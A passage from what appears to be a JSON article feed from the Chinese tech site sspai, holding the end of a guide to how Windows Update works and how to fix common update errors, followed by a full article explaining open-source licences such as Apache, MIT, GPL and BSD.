编码</h3>\n<p>定义更新是为 Windows 内置的安全软件 Windows Defender 而设计，Defender 借此升级最新的病毒库，维护系统安全。这和第三方防病毒程序的「自动更新病毒库」功能是类似的，只不过它被整合进了系统中。</p>\n<p>值得注意的是，除了版本号之外，这些定义更新名称之后跟着一个以 KB 开头的编码。在后文要介绍的质量更新中，KB 编码会更加多变且重要。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmj5b34taj5bdodig.png\"></figure><p>KB 是微软知识库（Microsoft Knowledge Base）的缩写。<a href=\"http://support.microsoft.com/\" target=\"_blank\">微软知识库</a> 即微软以<code>Support</code>开头的帮助网站，其中收录了微软产品的各种帮助文档，因而也不难猜出，KB 后面的数字是这些文档的代号。我们可以通过以通过<code>https://support.microsoft.com/kb/&lt;Number&gt;/en-us</code>或点击项目后的「了解详细信息」来访问某个更新项目的详细描述文档，重要更新配套的文档会给出本次更新的内容、警示、已知问题和影响的文件。</p>\n<p>定义更新后的 KB 编码都是一样的，说明它们都共享同一个帮助文档。</p>\n<h3>驱动更新</h3>\n<p>像它的名字所揭示的那样，驱动更新可用于更新硬件的驱动程序。驱动程序由微软和设备制造商合作提供，并且经过微软的测试和签名。</p>\n<p>在以往，这项任务一般由用户自己完成，因而会有设备制造商提供驱动下载页面，也有第三方的驱动商城。将驱动更新整合进系统显然安全方便了不少。</p>\n<p>除了负责任的厂商定期推送外，用户能在以下两种情况下收到这类更新。其一是全新安装时，微软的 ISO 镜像仅提供基本的功能，显示器、CPU 等硬件的驱动会在 Windows 启动后通过系统更新自动安装。其二是检测到新设备时，例如插入数位板，在 Android Bootloader 模式下连接电脑，此时用户可手动点击「检查更新」，可选的驱动列表会出现在更新界面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmjdb34tajfh55vt0.png\"></figure><h3>质量更新</h3>\n<p>质量更新是 Windows 最重要的一类更新，更新内容包括小的 Bug 和大的安全漏洞的修复，以及 UI、功能方面的微小改动。每一个质量更新都有单独的 KB 编码，也即，拥有一个单独的描述页面可供查阅。</p>\n<p>质量更新是三类更新的统称：OOB 更新，月度累积更新和月度更新预览。前两种为自动安装的更新，最后一种为可选更新。三类更新都是累积式的。</p>\n<p>OOB 是 Out of Band 的缩写，OOB 更新可以理解为主通道之外的更新方式。之所以设计在主通道之外，是因为它是对重大安全漏洞的及时修复，需要被立即推送并自动安装。OOB 更新没有固定的推送频率，但往往在微软公布某个重大安全漏洞之后的几天内推送。前文以 2021 年 7 月 6 日和 13 日的两次更新举过例子，这两次更新时间上离得如此之近，正是因为 7 月初微软公布了 PrintNightmare 安全漏洞，于是就有了 7 月 6 日的 OOB 更新。</p>\n<p>OOB 更新的描述文档中，还会引用来自 <a href=\"https://www.microsoft.com/zh-cn/msrc\" target=\"_blank\">微软安全响应中心</a> 的另一份文档。该文档是对此次 OOB 更新修复的漏洞的具体描述、评级和临时解决方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmjlb34taja4rofk0.png\"></figure><p>和 OOB 更新不同，上述例子中 7 月 13 日推送的更新被称为月度累积更新，或 B 更新。B 的含义是此更新会在每个月的第二个星期二定时推送，具体时间为北京时间凌晨 1 点。月度累积更新内容为日常的软件维护和修复。这个从 2003 年就固定下来的更新推送时间也被称为「补丁星期二」。</p>\n<p>月度更新预览和月度累积更新关系密切，它是下一个月的将要推送月度累积更新的提前释出版本，也叫 C 更新。月度更新预览是考虑到一些 IT 管理员需要提前测试更新内容，确认生产环境能够正确运行而设计的。因此它是可选更新，用户可以自行选择安装与否。</p>\n<p>质量更新负责维护 Windows 大版本更新后的系统体验，这也是 Windows 即服务口号下微软对更新做出的重要改动——以每月推送的质量更新、半年或一年推送一次的功能更新，取代以往数年一次的大版本更新。质量更新介绍完后，我们来介绍功能更新。</p>\n<h3>功能更新</h3>\n<p>上一小节提到，质量更新也会涉及到系统功能，例如通知栏中的新闻与兴趣就是通过质量更新推送的。但功能更新影响的功能与设计更为重磅：1607 周年更新引入了暗色模式，1903 版本推出了 Windows Sandbox 和改进的游戏录制栏……</p>\n<p>Windows 10 中，微软会在上半年 4 - 5 月，下半年 10 - 11 月，每半年推送一次功能更新，因此普通用户还被称为半年通道内的用户。功能更新显性的特点是拥有自己的代号，不展示 KB 编码但有专门的官方介绍文章和独立的 ISO 下载通道。在 Windows 11 中，功能更新频率被延缓为一年。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmjtb34taja4rofkg.png\"></figure><p>功能更新是一个新的开始，其更新内容并无规律可言，但一定拥有固定的支持周期。在一定时间内，微软会向某个版本推送质量功能直到其被之后的版本淘汰。这段提供安全维护的时间被称为支持周期。家庭版和专业版的支持周期一般为版本发行间隔加一年，也就是说，Windows 10 为 18 个月，Windows 11 为 24 个月。支持周期结束后，用户只有升级到新版本才能享受到质量更新。</p>\n<p>这种升级并非强制的，是可选更新。新版本释出后，微软会为支持的设备推送新版本，用户有留在旧版本的自由。当然，这种推送是分批且有延迟的，如果想要提前升级到新版本，有 <a href=\"https://www.microsoft.com/zh-cn/software-download/windows10\" target=\"_blank\">升级工具</a> 可供选择。</p>\n<h2>执行更新的步骤</h2>\n<p>除可选更新需要用户手动操作外，Windows 会自动扫描、下载并安装更新内容。对于定义更新这类小型项目，用户一般不会感知到其存在。但当 Windows 更新需要访问正在运行的某些系统组件时，它会在一切准备完毕后，弹出重启选项，这可能是用户对 Windows 更新感知最强烈的时候。</p>\n<p>此外，当出现错误，无法安装更新时，莫名奇妙的错误代码可能也会让一些用户抓狂。想要理解这两种情况，了解 Windows 执行更新的基本步骤是必要的。</p>\n<p>一次完整的更新会经过四个流程：下层阶段，SafeOS 阶段，首次启动和全新启动阶段。大部分情况下更新会在第一阶段结束，只有功能更新这样的大版本升级才会完整走完这四个流程，也正因为这种情况下的复杂性，重启才有必要，错误才会发生。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmk5b34taja4rofl0.png\"><figcaption>一次完整更新需要经过哪些步骤，图片来自 <a href=\"https://docs.microsoft.com/en-us/windows/deployment/upgrade/troubleshoot-upgrade-errors\" target=\"_blank\">微软</a></figcaption></figure><h3>下层阶段</h3>\n<p>这一阶段在将要更新的旧系统中进行。首先，系统根据用户设定的更新策略，连接服务器，扫描并评估更新是否适用于设备。一些「优化」指南中使用组策略、服务的方式禁用自动更新实际上就是影响了这一步。</p>\n<p>一旦确定有更新可用，Windows 会下载更新内容到临时文件夹。然后比较设备信息和下载的内容，确定如何安装这些更新。此时，更新程序会创建名为「操作列表」的文件，告诉安装程序如何处理这些更新。</p>\n<p>对于大部分更新，安装将直接进行且不会对正在运行的程序有影响，更新到此结束。</p>\n<p>而如果更新涉及了内核等重要组件，则必须要在 Windows 系统之外进行更新的部署。Windows 为此需要进入独立的 SafeOS。这种情况下，下层阶段最后的任务是准备好必要的文件，设定系统下一次重启的首选项为 SafeOS，然后等待用户确认重启操作以继续更新流程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmk5b34taja4roflg.png\"></figure><h3>SafeOS 阶段</h3>\n<p>SafeOS 阶段会进入 Windows PE 环境，不过此阶段首先做的是准备系统回滚文件，以防更新出错。之后如果出现任何问题，系统都会卸载更新，然后使用 SafeOS 生成的回滚文件确保设备仍能正常开机。</p>\n<p>留好后路之后，SafeOS 就会着手安装更新文件，替换旧系统的组件。并设定启动首选项为新的系统，再次重启。</p>\n<h3>首次启动和全新启动</h3>\n<p>告别 SafeOS 后，Windows 会在新环境中进行各种初始配置，识别设备的硬件。此过程称为首次启动。首次启动之后 Windows 会第三次重启，正式「开箱」进入新系统，所以此阶段还被称为 OOBE （Out of box experience）阶段。</p>\n<p>经过这四个阶段，Windows 更新程序既完成了对旧系统的备份，也部署了新的更新。成功进入新系统之前，最多会重启三次。整个过程如果有任何意料之外的情况发生，更新就会失败：下层阶段出现的问题会导致更新无法继续，后面三个阶段发生的错误则会导致系统回滚。</p>\n<h2>更新的常见错误及解决方法</h2>\n<p>如果设备原来的 Windows 系统运行正常，用户没有安装意图不明的软件，也没有删改某些系统文件，那么 Windows 更新大概率不会失败。但由于 Windows 运行的硬件软件环境难以预料，遇到更新问题也并不罕见。本文将给出一些常见的错误及其解决方法。</p>\n<h3>网络问题</h3>\n<p>下载错误发生在执行更新的下层阶段，错误大概率可归咎于网络。用户需要做的是等到网络环境良好时再进行更新。之后可以先清除原先下载的更新文件，即手动删除<code>C:\\Windows\\SoftwareDistribution\\Download</code>下的所有文件，再检查更新。</p>\n<p>当然，如果由于各种原因无法通过内置的更新功能下载内容，微软提供了变通的方法。</p>\n<p><a href=\"https://www.catalog.update.microsoft.com/Home.aspx\" target=\"_blank\">Microsoft Update Catalog </a>是微软官方提供更新内容下载的平台。Windows 的所有更新历史都是可查的。前文提到，每一次质量更新都有独立的 KB 编码，从<a href=\"https://support.microsoft.com/en-us/topic/windows-10-update-history-1b6aac92-bf01-42b5-b158-f80c6d93eb11\" target=\"_blank\"> Windows Update History</a> 界面找到需要的更新后，在 Catelog 输入其 KB 编号，下载适合本设备的版本双击即可安装。</p>\n<p>驱动程序更新则可通过设备制造商的官网获得。</p>\n<h3>系统组件损坏</h3>\n<p>此类错误经常表现在安装的下层阶段和最终的启动阶段。由于系统的某些组件损坏，Windows 无法找到或者修补原文件导致更新发生错误。至于系统组件损坏的原因，大概率是不知情的用户删除了某些关键系统文件，或者某些恶意软件作祟。</p>\n<p>好在 Windows 自带了修复的工具，以管理员权限运行 PowerShell，键入<code>DISM.exe /Online /Cleanup-Image /RestoreHealth</code>，这会使用 Windows 更新作为源文件，尝试修复损坏的系统组件。如果手上有 Windows 镜像，也可以在命令后加<code>/Source:C:\\…… /LimitAccess</code>告诉 DISM 使用该镜像作为源文件。</p>\n<h3>第三方加密软件问题</h3>\n<p>这类错误发生在重启至 SafeOS 阶段，原因大概率是第三方的磁盘加密软件阻止系统进入 SafeOS。解决方法是提前解密。</p>\n<p>之所以 Windows 自身的加密不会导致类似的问题，是因为更新程序预先执行了 BitLocker 的解密步骤。</p>\n<h3>硬件及其驱动问题</h3>\n<p>在首次和全新启动阶段，新系统会进行配置的初始化，如果此时碰到没有驱动程序支持的硬件，更新也会出现错误。</p>\n<p>如果在这两个阶段出现问题，那么用户可能需要提前清理一些不必要的外设，例如风扇、手柄等。在安装功能更新前总是保证驱动程序最新也是很好的习惯。</p>\n<h3>In-Place Upgrade 和 SetupDiag</h3>\n<p>如果确认更新失败并非由以上四种问题引发，那么下面这两个方法值得一试，它们能解决或定位绝大多数更新错误。</p>\n<p>In-Place Upgrade 是解决各种由于系统组件和设置造成的更新问题的最好方式。它修复系统的方式是对原系统进行一次原地更新：用镜像设置替换原系统的组件和设置，还原系统纯净的环境。这会初始化所有的系统设置，但不会丢失任何的应用及文件。</p>\n<p>详细的操作流程可以参考 <a href=\"https://www.tenforums.com/tutorials/16397-repair-install-windows-10-place-upgrade.html\" target=\"_blank\">TenForums</a> 的教程。它和使用易升提前获取功能更新近似，简单来说包括三个关键步骤：</p>\n<ol>\n<li>从 <a href=\"https://www.microsoft.com/en-us/software-download/windows10\" target=\"_blank\">微软官方</a> 获取和电脑运行系统同版本的 ISO 文件；</li>\n<li>挂载 ISO 文件，双击其中的<code>setup.exe</code>；</li>\n<li>在之后的更新步骤中，选择保留应用和文件，等待更新完毕。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/48da8b171b11d5a0541fbf535c02ab19\"><figcaption>图片来自 TenForums</figcaption></figure><p>此方法本质上是不丢失文件和应用的还原操作，和设置面板中提供的「全新启动」类似。但当系统的某些问题已经导致无法安装更新时，「全新启动」功能很可能也会出现问题，采用镜像修复的方式更加稳妥。</p>\n<p>更复杂的情况则需要考虑使用 SetupDiag。这是微软推出的一款更新日志分析工具，官方已经给出的详细的 <a href=\"https://docs.microsoft.com/zh-cn/windows/deployment/upgrade/setupdiag\" target=\"_blank\">使用教程</a>。用户遇到升级问题时，下载并双击打开此工具，它会生成日志分析文件，通过比对生成的<code>SetupDiagResults.log</code> 和官方给出的 <a href=\"https://docs.microsoft.com/zh-cn/windows/deployment/upgrade/setupdiag#%E8%A7%84%E5%88%99\" target=\"_blank\">规则</a>，即可准确定位错误发生的阶段及原因，工具同时会给出解决方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56mmklb34tajfh55vtg.png\"><figcaption>图片来自 SetupDiag 文档</figcaption></figure><h2>总结</h2>\n<p>微软一直在优化 Windows 更新的体验。它如此耗费心力的目的很显然不是如一些「指南」所暗示的那样拖慢用户的系统，而是最大程度上保证自家产品的安全性，毕竟除了是市场占有率最高的桌面系统，Windows 也占有 20% 的服务器市场。</p>\n<p>目前，排除 OOB 这类紧急更新，Windows 重要的（可能需要重启的）更新频率仅为每月一次，重启前会请求用户确认，用户亦可以择时自行重启，因而本文并不建议用户采用非正常手段关闭自动更新以减少这必要的打扰。即使需要延迟进行更新，也建议采用将某网络设置为<code>按流量计费</code>的方式，或使用<code>暂停更新</code>选项。</p>\n<p>最后，祝愿读者 <a href=\"https://docs.microsoft.com/en-us/windows-insider/flight-hub/\" target=\"_blank\">飞行愉快</a> ;)</p>\n<h2>参考资料</h2>\n<ul>\n<li>术语： <a href=\"https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/standard-terminology-software-updates\" target=\"_blank\">Windows 更新术语</a>，翻译以 Windows 11 的中文语言包为准</li>\n<li>OneCore 和 DLL 解释：Windows Internals 7th, Chapter 1, ISBN: 9780133986471</li>\n<li>累积更新：<a href=\"https://docs.microsoft.com/en-us/windows/deployment/update/waas-optimize-windows-10-updates\" target=\"_blank\">Optimize Windows client update delivery</a>\n</li>\n<li>质量更新：<a href=\"https://techcommunity.microsoft.com/t5/windows-it-pro-blog/windows-quality-updates-primer/ba-p/2569385\" target=\"_blank\">Windows quality updates primer</a>\n</li>\n<li>执行更新的步骤：<a href=\"https://docs.microsoft.com/en-us/windows/deployment/upgrade/troubleshoot-upgrade-errors\" target=\"_blank\">Troubleshooting upgrade errors</a> 和 <a href=\"https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works\" target=\"_blank\">How Windows Update works</a>\n</li>\n<li>更新常见问题：<a href=\"https://docs.microsoft.com/en-us/windows/deployment/upgrade/resolve-windows-10-upgrade-errors\" target=\"_blank\">Resolve Windows 10 upgrade errors</a>\n</li>\n</ul>\n<p>封面来自：<a href=\"https://www.freepik.com/vectors/technology\" target=\"_blank\">freepik</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68959"},{"title":"「自由」的边界——详解开源许可证","date":"2021-09-24 06:56:17","description":"\n<h2>引言</h2>\n<p>2018 年，因为使用他人「免费」提供的源代码，国内一家软件公司被告上了法庭。</p>\n<p>在数字天堂（北京）网络技术有限公司（「数字天堂公司」）诉柚子（北京）科技有限公司、柚子（北京）移动技术有限公司（「柚子公司」）侵犯计算机软件著作权纠纷一案中，原告数字天堂公司主张：被告柚子公司的 APICloud 软件抄袭了其按照 GPL 许可证分发的 HBuilder 开发工具软件源代码，侵犯了其著作权，要求赔礼道歉、消除影响并赔偿损失。</p>\n<p>经北京知识产权法院初审、北京高级人民法院二审，柚子公司最终被判停止侵权并赔偿 71 万元。</p>\n<p>如果缺少背景知识，这个被称为「中国 GPL 诉讼第一案」的重要案件可能有些不好理解。根据法院的认定，「原告的 HBuilder 软件是 GPL 协议下的开源软件分支。根据 GPL 协议的规定，任何第三方有权在 GPL 协议授权下使用其代码并构建衍生软件产品 […] 原被告双方的涉案软件均为免费软件 [对应英文术语为 free software，通译为「自由软件」，但原文如此]。」</p>\n<p>既然是「任何第三方有权使用」的「免费」软件，为什么会侵权又要赔偿呢？</p>\n<p>弄清楚这个问题不仅仅具有法律上、学术上的意义。俗话说「不要重复造轮子」，对于很多软件开发项目而言，开源软件正是那些起着地基作用的「轮子」。因此，如何合规利用开源软件，了解开源许可证的内容已成为各大互联网公司的重要课题。</p>\n<p>过去，对开源软件合规问题的讨论在美国相对较多，各类判例也相对丰富；「中国 GPL 诉讼第一案」则让国内公司也意识到了开源问题的重要性。实际上，中国互联网企业的崛起有赖于开源；GitHub 预测到 2030 年中国开发者将成为全球最大的开源群体。新一代的操作系统、分布式数据库、人工智能框架都通过开源项目快速进步。如 360 的董事长周鸿祎所言，如果没有开源软件，就没有中国互联网的飞速发展。</p>\n<p>因此，无论你是准备在开发项目中使用开源代码，还是计划将自己的软件以开源方式，抑或只是下载使用开源软件的普通用户，都值得花些时间认真了解开源软件及其许可证。</p>\n<h2>开源软件与开源许可证</h2>\n<h3>开源软件</h3>\n<p>顾名思义，从最简单的意义上说，「开源软件」就是<strong>开放源代码</strong>的软件；换言之，是人们能够免费且不受限制地使用、再开发、再发布的软件。</p>\n<p>但从狭义上说，只有符合开放源代码促进会（Open Source Initiative）<a href=\"https://opensource.org/osd\" target=\"_blank\">定义</a>的软件才是开源软件。该定义提出了十个特征，必须全部符合才能认定为开源软件；除了包括可自由再分发、提供源代码、允许衍生作品这些应有之义，还要求不得过度限制原始代码的修改，不得歧视特定人、群体或用途，必须「技术中立」等。</p>\n<p>在这样的标准下，一些看似自由使用的软件就「不够格」称为开源软件了。例如，知名的全文搜索引擎 Elasticsearch 原来使用 Apache 2.0 授权，是货真价实的开源软件。但面对 AWS 等云服务厂商使用 Elasticsearch 作营利用途、却又不反向回馈其所做改进的现状，Elasticsearch 在 2021 年 1 月选择改用SSPL（Server Side Public License、服务器端公共许可证）和 Elastic License 两种许可证并行。</p>\n<p>其中，SSPL 的条款基本与常见开源许可证 GPLv3 一致，但要求「如果将程序的功能或修改后的版本作为服务提供给第三方，那么必须免费公开提供服务源代码」；换言之，如果你用了我的程序提供服务，就要大方地把整个配方（包括前后台）都交出来。这违背了 OSI 对开源软件定义的第 9 条规定（许可证不能限制其它的软件），因此不能算「开源」。</p>\n<p>另一方面，Elastic License 虽然不限制其他软件，但要求不能向第三方提供主机或托管服务。这违反了 OSI 定义的第 6 条（不得限制使用领域），因此也不算严格意义上的「开源」。</p>\n<h3>开源许可证</h3>\n<p>所谓软件许可证，就是随软件一起发布，对软件的使用、修改和分享及其他相关事宜作出规定的条款。开源许可证，就是开源软件使用的许可证。</p>\n<p>这里，一个存在争议的重要问题是软件许可证的法律界定。在美国，一些法院认为软件许可证是合同（contract），一些法院则认为是许可（license）。两者的区别在于，许可在传统上是由地产或物主作出的，目的在于允许他人使用自己的地块或物品。因此，它是单方向的，不构成完整的合同，而是作为合同的一个要素，用来和他人交换的条件。</p>\n<p>合同和许可之分在美国法上具有重要意义。如果是合同，那么需要适用各州不同的合同法；如果是许可，那么需要适用统一的联邦版权法。除此以外，合同的违约救济和版权的侵权救济也有着诸多不同，比如禁令（行为保全）的适用、判赔额的确定、律师费的分担等。</p>\n<p>不过，包括中国在内的大陆法系国家，则普遍认为开源软件许可证构成合同；只不过这种许可合同并非协商得到，而是事先规定好的标准化格式合同罢了。具体来讲，开源许可证是涉及版权、专利、商标等一系列权利义务的格式合同，且自动生效。</p>\n<p>法律并没有限定许可证不能包含什么条款，这导致许可证的类型极其繁多、内容也非常自由。据不完全统计，广义上的开源许可证目前有超过 200 种，即便是 OSI 批准的许可证目前也有 96 个之多。</p>\n<p>一些开源许可证的规定可谓「天马行空」。例如，啤酒软件许可证（Beerware License）规定，用户与作者聚会时可以请作者喝一杯啤酒；Jason Hunter 许可证规定，如果将该许可证下的代码用于商业目的，那么项目开发团队的所有成员都必须拥有 Jason Hunter 撰写的《Java Servlet编程》最新版。</p>\n<p>但幸运的是，绝大多数开源软件使用的都是几种常见的许可证之一。因此，了解常见许可证的内容一般就足以应付大多数实务场景了；根据专门提供开源软件合规服务的 Whitesource 的调查报告，90% 左右的开源软件都在使用 10 个许可证（包括同一许可证的不同版本），具体如下图所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/18/article/44b3b315c03435acba75c83de51c2386\"></figure><p>下面，我们挑选其中排名靠前的几个重要许可证具体介绍。</p>\n<h2>常见开源软件许可证介绍</h2>\n<h3>Apache</h3>\n<p>排名第一、风头正劲的是 <a href=\"https://opensource.org/licenses/Apache-2.0\" target=\"_blank\">Apache 2.0 许可证</a>，它在近年夺下了 MIT 许可证的宝座，成为使用最多的许可证。</p>\n<p>Apache 许可证是一种「宽松」（permissive）的许可证，目前常用版本是 2.0。这里，「宽松」是指不保证被使用软件的派生版会继续保持自由软件的形式。换言之，就是「怎么用都行，用在哪都行」。与之相对的是著<strong>佐</strong>权许可证（Copyleft），要求使用者修改后的衍生作品必须要以同等的授权方式释出以回馈社会，即强调「互惠性」。</p>\n<p>具体而言，Apache 2.0 许可要求保留版权和许可声明，但允许许可作品、修改和更大的作品在不同的条款和没有源代码的情况下分发，只是未修改的部分仍然需要保留 Apache 许可证。此外，Apache 许可证不仅及于软件的版权，还及于软件的专利权，解决了开发者的另一大心病。</p>\n<p>由于上述利好条件，Apache 2.0 成为了相当多流行的开源项目的许可证，最著名的例子之一就是 Kubernetes。</p>\n<h3>MIT</h3>\n<p>排名第二的 MIT 许可证之名源自首倡者麻省理工学院（Massachusetts Institute of Technology, MIT），又称「X许可协议」（X License）或「X11许可协议」（X11 License）。</p>\n<p>据统计，2015 年 Github 上高达 45% 的项目都使用 MIT 许可证。哪怕最近几年 MIT 许可证的份额有所下滑，甚至 2020 年市场份额第一的位置被 Apache 2.0 取代， MIT 许可证仍然是最受开发者欢迎的许可证之一。</p>\n<p>MIT 的特点在于条款非常简单，实质内容就是一句长长的授权：「被许可人有权利使用、复制、修改、合并、出版发行、散布、再许可和/或贩售软件及软件的副本，及授予被供应人同等权利」，加上要求被许可人保持同样的声明。</p>\n<p>如 GitHub 高级产品经理、同时也是一名律师和开发者的 Ben Balter 所说，开发者选择 MIT 许可是因为「它简短而直接 […] 显然是一个为开发者优化的许可证。你不需要法律学位就能理解，而且实施起来也很简单。」</p>\n<p>几年前，Facebook 公开用 MIT 许可证取代了有争议的 React 许可证。其他使用 MIT 许可证的知名开源软件或者项目包括 Angular.js、Rails 和 .Net Core 等。</p>\n<h3>GPL 许可证家族</h3>\n<p>这就是文首所述案件的主角，让柚子公司翻船的开源许可证，也是争议和疑问最多的许可证之一。</p>\n<p>GPL 许可证是一个许可证家族的泛称，先行常用的具体包括 GPL v2、GPL v3 和 LPGL v2.1 等。这组许可证的共同特征在于「臭名昭著」的<strong>传染性</strong>：<strong>任何基于 GPL 代码编写的软件都必须成为开源软件。</strong>换言之，使用了任何 GPL 代码的软件，无论 GPL 代码的占比多少，都必须将完整的源代码公开，并允许他人修改、发布。</p>\n<p>或许正是由于限制过于严苛，GPL 家族的许可证的市场份额持续下降。但考虑到其历史地位和实务重要性，仍然有了解研究的价值。</p>\n<p>GPL</p>\n<p>初版 GPL 由前自由软件基金会的主席、知名开发者理查德·斯托曼于 1989 年编写，提供给列入 GNU 项目的一些软件程序使用（最有名的包括文字编辑器 Emacs、C 语言编译器 GCC 等）。1991 年 6 月，稍加完善的 GPLv2 发布，这也是很长一段时间以来使用最广泛的版本。</p>\n<p>GPLv2 许可证尽管经典，但也存在一些漏洞。例如，它不能阻止一个软硬件结合的系统中，通过对硬件部分施加限制，间接阻止用户在在该硬件上运行软件的修改版本，即所谓的「Tivo 化」问题。此外，它没有包括关于专利的约定，导致实践中出现 Microsoft-Novell 专利协议这类试图将专利申请用作于对付自由软件社群的武器的现象。</p>\n<p>为解决这些问题，GPL v3 于 2007 年发布。除了填补上述漏洞，跟 GPL v2 相比，GPL v3 的兼容性更好。所谓兼容性，是指这两个许可证下的代码可以合并为一个更大的项目。自由软件基金会明确表示GPL v3 与 Apache 2.0 许可证兼容。</p>\n<p>目前，仍然使用 GPL 许可证的重要项目包括 Linux 内核和 MySQL 等，但新兴的项目会一般会选用更宽松的许可证。</p>\n<p>LGPL</p>\n<p>开源软件并不一定是能独立运行的完整软件，也可能是不能独立运行，而是作为其他软件的组成部分、提供功能支撑的代码库（library）。对于这类使用场景，原版 GPL 的规定显得过于严苛了。</p>\n<p>因此，在 GPL v2 发布同时，程序库通用许可证（Library General Public License，LGPL）也随之诞生。最初，LGPL 是 GPL 的补充，版本也追随 GPL，但从 LGPL v2.1 发布开始具有了独立身份，也被重命名为GNU宽通用公共许可证（Lesser General Public License，简称仍然是 LGPL）。</p>\n<p>LGPL 的特点在于，链接到该软件库的软件可以不适用 LGPL 或 GPL，换言之，可以不公开源代码。LGPL 的这一特性消除了在 GPL 下软件商用的最大障碍。尽管如此，基于该库修改而得到的软件仍然需要遵循 GPL 许可证。</p>\n<p>一个很有趣的问题是。理查德·斯托曼本是一个坚持软件自由丝毫不可侵犯的人，为什么像他这样的人会同意将自己的代码用于闭源产品？这其实是他以退为进、推广 GNU C 语言库的策略。1991 年的时候，市场上有很多 C 语言库可以选择。如果 GNU 的 C 库是原版 GPL 许可证授权，那么很多私有软件不会选择它。闭源软件中有开源的成分，总比一点没有好。（这也就解释了为什么后来 JavaScript 的代码库，大多数都选择了类似 BSD 的宽松许可证而不是 GPL 许可证——因为可替代的竞争者实在太多了。）</p>\n<h3>BSD</h3>\n<p>BSD 许可证是由加州大学伯克利分校首倡和维护的，同样是一个版本繁多的「家族」。目前常用的版本包括原始的 4 句许可证（BSD）、修改的 3 句许可证（BSD3）以及简化的 2 句许可证（BSD2）。</p>\n<p>BSD 属于宽松许可证，与 MIT 许可证接近但更加宽松，甚至跟公有领域更为接近。在最简化的 BSD2 许可证下，保留著作权声明、许可证内容以及免责声明即可；只要满足许可证设定的条件，就可以自由地修改并发布代码。</p>\n<p>BSD3 许可证在 BSD2 许可证的基础上增加了禁止背书条款（未经事先书面许可不得使用原作者之名来推广衍生作品）；BSD许可证进一步增加了广告条款（衍生作品的广告材料必须说明该软件「包含由加州大学伯克利分校及其贡献者开发的软件」）。</p>\n<h2>开源许可证的选择</h2>\n<p>既然开源许可证如此多元，如果你自己打算开展一个开源开发项目，该如何从上百个开源许可证选择合适自己项目的开源许可证？</p>\n<p>对于这个问题，比较实用的工具是乌克兰程序员 Paul Bagwell 的分析图，通过简单的三步判断给出推荐，基本能满足大部分人的需求。由阮一峰制作的中文版如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/18/article/45d1a895b6e2745420a1db762fbcb2b7\"></figure><p>如果需要更专业的分析，建议查询 Github 建立的 choosealicense.com。该网站从 13 个维度对比许可证，并提供选择建议。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/18/article/8aa0302fad76ca00796121a3531fe8ce\"></figure><p>顺带一提，从上表可以看出，除了上文提到过的允许商业性使用、分发和修改外等常见特征外，开源许可证还有两个共同点：首先，开发者不承担保证责任（瑕疵担保责任）。开源代码通常都是免费提供的，因此开发者不应为他人使用该软件造成的损失而承担责任。其次，要求保留著作权标记。开源软件并不意味着放弃著作权。相反，开源许可证的强制效力来源，恰恰来自于作者对开源软件的著作权。因此，许可证一般都要求以适当的形式保留著作权标记（包括许可证正文以及作者署名）。</p>\n<h2>结语：开源软件的动向和展望</h2>\n<p>浏览过去几年开源领域的动态，就会发现商业公司对于开源的重视程度不断提高，即使传统厂商对于开源软件和技术的态度也越来越开放。先有 IBM 以 340 亿美元收购了开源软件制造商 Red Hat，后有 Salesforce 以 65 亿美元收购了 Mulesoft。</p>\n<p>就连一直以封闭而「臭名昭著」的微软，也努力展现拥抱开源的姿态：在 2018 年携 6 万件专利加入开放发明网络（OIN，Open Invention Network），后又斥资 75 亿美元收购 GitHub。大型科技公司一方面依赖于开放源码项目，另一方面也为其贡献代码，或在开源许可证下提供自己的内部工具，并将其作为反映企业责任感的宣传点。由此可以预见，整个开源体系的扩大使得开源许可张会发挥越来越重要的作用。</p>\n<p>开源领域的另一个动向是，开发者试图突破传统开源许可证的固有模式，在创造可行的商业模式和维护成功的开源项目之间寻找更好的平衡。越来越多小型但关键项目的开发者，开始寻求更新开源许可证或者创建新的许可证。上文所提到 Elastic 之所以不惜放弃开源之名，也要换掉 Apache 许可证，正是现有许可证不能满足新需求的一次矛盾集中体现。</p>\n<p>最后，开源项目所体现的数字优先思维方式和远程优先协作模式，在新冠疫情的背景下也价值凸显，为行业调整工作方式提供了经验。</p>\n<p>在讨论开源开发模式的《大教堂与集市》一书中，Eric Raymond 力主那种在开发过程中即将源代码公开以便查阅和反馈的「集市模式」，并预言：</p>\n<blockquote><p>开放式的文化会最终胜利，这或许不是因为「开放」在道德上正确，或者「封闭」在道德上错误，而只是因为开放式合作可以在一个问题上投入多几个数量级的技术工时，封闭的世界无法赢得这样的竞争。</p></blockquote>\n<p>今天回看，「集市」的理念无疑正被越来越多的公司和开发者接受。不过，集市越大、交易越多，规则的重要性也就更高。开源许可证正是开源软件这个思维「集市」中的交易规则；让我们一起期待它更精彩的演化。</p>\n","link":"https://sspai.com/post/68876"},{"title":"国产动画《一人之下》第四季开播，你感觉如何？","date":"2021-09-24 